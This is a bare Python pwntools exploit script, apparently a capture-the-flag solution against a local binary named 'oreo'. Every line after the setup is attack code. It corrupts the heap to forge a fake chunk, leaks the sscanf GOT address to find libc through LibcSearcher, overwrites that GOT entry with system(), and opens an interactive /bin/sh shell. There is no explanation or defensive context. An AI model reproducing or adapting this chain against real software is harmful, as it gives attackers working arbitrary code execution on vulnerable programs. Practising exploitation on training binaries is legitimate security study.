from pwn import *
from LibcSearcher import *
context(arch='amd64',os='linux')
context.log_level = 'debug'
io = process('./oreo')
elf = ELF('./oreo')

def add(name,content):
	io.sendline('1')
	io.sendline(name)
	io.sendline(content)
	
def show():
	io.sendline('2')

def order():
	io.sendline('3')
	
def message(notice):
	io.sendline('4')
	io.sendline(notice)
	
def stats():
	io.sendline('5')
	

scanf_got = elf.got['__isoc99_sscanf']
target = 0x804a29c
io.recv()
add('b','b')
add('a','a')
for i in range(0x40):
	order()
io.recv()
payload = 'a'*(0x38-25)+p32(0)+p32(0x40)+p32(target)
add(payload,'c')
add('b','b')
payload = p32(4)
payload += p32(scanf_got)
add('a',payload)
stats()
io.recvuntil('Message: ')
scanf_addr = u32(io.recv(4))
log.success('__isoc99_sscanf address: '+hex(scanf_addr))
obj = LibcSearcher('__isoc99_sscanf',scanf_addr)
libc_base = scanf_addr - obj.dump('__isoc99_sscanf')
sys_addr = libc_base + obj.dump('system')
log.success('system address: '+hex(sys_addr))
message(p32(sys_addr))
io.sendline('/bin/sh\x00')
io.interactive()
